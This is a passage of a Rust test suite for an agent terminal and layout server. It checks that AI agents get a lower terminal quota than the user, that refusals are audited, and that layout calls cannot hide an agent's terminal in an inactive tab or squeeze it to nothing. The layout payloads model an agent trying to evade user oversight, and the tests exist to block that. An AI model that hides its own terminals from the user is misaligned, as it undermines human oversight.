    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    let work = distinctive_dir();
    let secret = work.path().to_string_lossy().into_owned();
    let baseline = Baseline::take(&env, &[TAG]);

    for (what, mut worker) in [
        ("an empty pty_id", env.mcp(Some("")).await),
        ("no pty_id", env.mcp(None).await),
    ] {
        let res = worker
            .call(OPEN_TERMINAL, json!({"working_directory": secret}))
            .await;

        assert_eq!(res["error"], "unknown_view", "{what}: {res}");
        baseline.assert_nothing_happened(&env, what);
    }
}

#[tokio::test]
async fn open_terminal_is_allowed_for_a_plain_agent_session_and_audited_as_opened() {
    let _turn = serial().await;
    let env = Env::start(&[]).await;
    env.init_focus(TAG);
    env.session_mgr
        .lock()
        .unwrap()
        .set_focus_registry(vec![focus_meta(TAG)]);
    // A policy that withdraws the tool from some other agent changes nothing here.
    let _policy = PolicyFile::arm("agents:\n  perri:\n    deny:\n      - nostromo.open_terminal\n");
    let mut mcp = env.mcp(Some(TAG)).await;
    let work = distinctive_dir();

    assert!(lists_open_terminal(&mcp.list_tools().await));
    let res = mcp
        .call(
            OPEN_TERMINAL,
            json!({"working_directory": work.path().to_string_lossy()}),
        )
        .await;

    assert_eq!(res["ok"], true, "{res}");
    let opened = env.opened_lines();
    assert_eq!(opened.len(), 1, "{opened:?}");
    assert_eq!(opened[0]["requested_by"], "focus", "{}", opened[0]);
    assert_eq!(opened[0]["tag"], TAG, "{}", opened[0]);
    assert!(
        !env.audit()
            .iter()
            .any(|l| l["event"] == "refused" && l["tool"] == OPEN_TERMINAL),
        "an allowed open is not a refusal"
    );
}

// ═════════════════════════════════════════════════════════════════════════════
// S1: agents have a smaller terminal quota than the user
// ═════════════════════════════════════════════════════════════════════════════

fn user_open_msg(tag: &str, request_id: &str) -> ClientMsg {
    ClientMsg::TerminalOpenLocal {
        tag: tag.into(),
        relative_to: None,
        position: None,
        cwd: None,
        client_request_id: request_id.into(),
    }
}

#[tokio::test]
async fn the_third_open_terminal_in_a_focus_hits_the_agent_quota_while_the_user_can_still_open() {
    let _turn = serial().await;
    let env = Env::start(&[Peer::App]).await;
    env.init_focus(TAG);
    let mut app = env.app(vec![Topic::Terminal, Topic::Layout]).await;
    let mut mcp = env.mcp(Some(TAG)).await;
    let work = TempDir::new().expect("tempdir");
    let before = child_pids();

    for n in 1..=2 {
        let res = mcp
            .call(
                OPEN_TERMINAL,
                json!({"working_directory": work.path().to_string_lossy()}),
            )
            .await;
        assert_eq!(res["ok"], true, "agent terminal {n}: {res}");
    }
    let leaves = env.pane_ids(TAG);
    let shells = new_children(&before).len();
    assert_eq!(shells, 2, "harness: two shells so far");

    let distinct = distinctive_dir();
    let secret = distinct.path().to_string_lossy().into_owned();
    let res = mcp
        .call(OPEN_TERMINAL, json!({"working_directory": secret}))
        .await;

    assert_eq!(res, json!({"error": "terminal_agent_quota_reached"}));
    assert_eq!(env.opened_lines().len(), 2, "only two opens were audited");
    assert_eq!(env.all_terminals().len(), 2);
    assert_eq!(env.pane_ids(TAG), leaves, "no leaf was placed");
    assert_eq!(new_children(&before).len(), shells, "no process started");
    let line = env
        .audit_line("the quota refusal", |l| {
            l["event"] == "refused" && l["channel"] == "mcp" && l["tool"] == OPEN_TERMINAL
        })
        .await;
    assert_eq!(line["op"], "open", "{line}");
    assert_eq!(line["code"], "terminal_agent_quota_reached", "{line}");
    assert_eq!(line["focus"], TAG, "{line}");
    assert_content_free(&env, &line, &secret);

    // The rest of the focus is the user's.
    let from = app.mark();
    app.send(&user_open_msg(TAG, "user-after-quota")).await;
    let opened = app
        .wait_for(from, "the user's terminal", |m| {
            matches!(m, ServerMsg::TerminalState { terminal }
                if terminal.opened_by_request.as_deref() == Some("user-after-quota"))
                || matches!(m, ServerMsg::TerminalRefused { .. })
        })
        .await;
    let ServerMsg::TerminalState { terminal } = opened else {
        panic!("the user's open was refused: {opened:?}");
    };
    assert_eq!(terminal.tag, TAG);
    assert_eq!(terminal.requested_by.kind, "user");
    assert_eq!(env.all_terminals().len(), 3);
    assert_eq!(env.opened_lines().len(), 3);

    // The user's terminal did not free the agent's quota.
    let res = mcp.call(OPEN_TERMINAL, json!({})).await;
    assert_eq!(res, json!({"error": "terminal_agent_quota_reached"}));
}

// ═════════════════════════════════════════════════════════════════════════════
// N3: a layout call cannot hide a terminal behind a tab or squeeze it out
// ═════════════════════════════════════════════════════════════════════════════

impl Live {
    /// Like `assert_protected`, for a refusal that is not `terminal_pane_protected`.
    async fn assert_layout_refused(&mut self, tool: &str, args: Value, code: &str) {
        let tree_before = self.env.tree(TAG);
        drain(&mut self.rx);
        let since = self.app.mark();
        let lines_before = self
            .env
            .audit()
            .iter()
            .filter(|l| l["event"] == "refused" && l["tool"] == tool && l["code"] == code)
            .count();

        let res = self.mcp.call(tool, args).await;

        assert_eq!(res["error"], code, "{tool}: {res}");
        let line = self
            .env
            .audit_line(&format!("a {code} refusal of {tool}"), |l| {
                l["event"] == "refused"
                    && l["channel"] == "mcp"
                    && l["tool"] == tool
                    && l["code"] == code
            })
            .await;
        assert_eq!(line["op"], "layout", "{line}");
        assert_eq!(line["focus"], TAG, "{line}");
        let lines_after = self
            .env
            .audit()
            .iter()
            .filter(|l| l["event"] == "refused" && l["tool"] == tool && l["code"] == code)
            .count();
        assert_eq!(lines_after, lines_before + 1, "one new refusal line");
        assert_eq!(self.env.tree(TAG), tree_before, "{tool}: the tree changed");
        let after = drain(&mut self.rx);
        assert!(
            !after
                .iter()
                .any(|m| matches!(m, ServerMsg::FocusLayout { tag, .. } if tag == TAG)),
            "{tool}: a refused call must not broadcast a layout: {after:?}"
        );
        self.assert_unchanged(since, tool).await;
    }
}

#[tokio::test]
async fn set_pane_layout_cannot_bury_a_terminal_in_an_inactive_tab_or_squeeze_it_out() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let pane = live.pane().to_string();

    // An inactive tab.
    live.assert_layout_refused(
        "nostromo.set_pane_layout",
        json!({"view_id": TAG, "ratios": {
            "kind": "split",
            "direction": "horizontal",
            "children": [
                {"kind": "leaf", "pane_id": "repl"},
                {"kind": "tabs", "children": [
                    {"kind": "leaf", "pane_id": "notes"},
                    {"kind": "leaf", "pane_id": pane}
                ], "labels": ["Notes", "Shell"], "active": 0}
            ],
            "ratios": [0.5, 0.5]
        }}),
        "terminal_pane_hidden",
    )
    .await;

    // A full tree giving it 5% of its split.
    live.assert_layout_refused(
        "nostromo.set_pane_layout",
        json!({"view_id": TAG, "ratios": {
            "kind": "split",
            "direction": "horizontal",
            "children": [
                {"kind": "leaf", "pane_id": "repl"},
                {"kind": "leaf", "pane_id": pane}
            ],
            "ratios": [0.95, 0.05]
        }}),
        "terminal_pane_too_small",
    )
    .await;

    // The flat ratio map, to nothing.
    live.assert_layout_refused(
        "nostromo.set_pane_layout",
        json!({"view_id": TAG, "ratios": {"repl": 1.0, pane.clone(): 0.0}}),
        "terminal_pane_too_small",
    )
    .await;

    live.prove_responsive().await;
}

#[tokio::test]
async fn apply_layout_cannot_bury_a_terminal_in_an_inactive_tab_or_squeeze_it_out() {
    let _turn = serial().await;
    let mut live = Live::start().await;
    let pane = live.pane().to_string();

    live.assert_layout_refused(
        "nostromo.apply_layout",
        json!({"tree": {
            "direction": "horizontal",
            "ratios": [0.5, 0.5],
            "children": [
                {"pane": "repl"},
                {"tabs": [
                    {"pane": "notes", "label": "Notes"},
                    {"pane": pane, "label": "Shell"}
                ], "active": "notes"}
            ]
        }}),
        "terminal_pane_hidden",
    )
    .await;

    live.assert_layout_refused(
        "nostromo.apply_layout",
        json!({"tree": {
            "direction": "horizontal",
            "ratios": [0.95, 0.05],
            "children": [{"pane": "repl"}, {"pane": pane}]
        }}),
        "terminal_pane_too_small",
    )
    .await;

    live.prove_responsive().await;
}
